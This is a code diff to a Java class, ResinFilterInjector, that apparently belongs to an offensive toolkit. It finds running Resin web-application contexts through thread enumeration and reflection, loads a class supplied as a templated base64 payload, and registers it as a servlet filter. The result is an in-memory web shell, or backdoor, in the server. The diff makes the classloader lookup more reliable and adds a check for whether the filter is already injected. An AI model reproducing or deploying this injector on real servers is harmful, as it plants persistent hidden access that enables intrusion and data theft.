@@ -41,6 +41,10 @@ public class ResinFilterInjector {
         return "{{base64Str}}";
     }
 
+    /**
+     * com.caucho.server.webapp.Application
+     * /usr/local/resin3/lib/resin.jar
+     */
     public List<Object> getContext() throws Exception {
         Set<Object> contexts = new HashSet<Object>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
@@ -60,12 +64,17 @@ public class ResinFilterInjector {
         return Arrays.asList(contexts.toArray());
     }
 
+    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            return ((ClassLoader) getFieldValue(context, "_classLoader"));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -82,12 +91,7 @@ public class ResinFilterInjector {
             System.out.println("filter already injected");
             return;
         }
-        Class<?> filterMappingClass;
-        try {
-            filterMappingClass = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.FilterMapping");
-        } catch (Exception e) {
-            filterMappingClass = context.getClass().getClassLoader().loadClass("com.caucho.server.dispatch.FilterMapping");
-        }
+        Class<?> filterMappingClass = context.getClass().getClassLoader().loadClass("com.caucho.server.dispatch.FilterMapping");
         Object filterMappingImpl = filterMappingClass.newInstance();
         invokeMethod(filterMappingImpl, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
         invokeMethod(filterMappingImpl, "setFilterClass", new Class[]{String.class}, new Object[]{getClassName()});
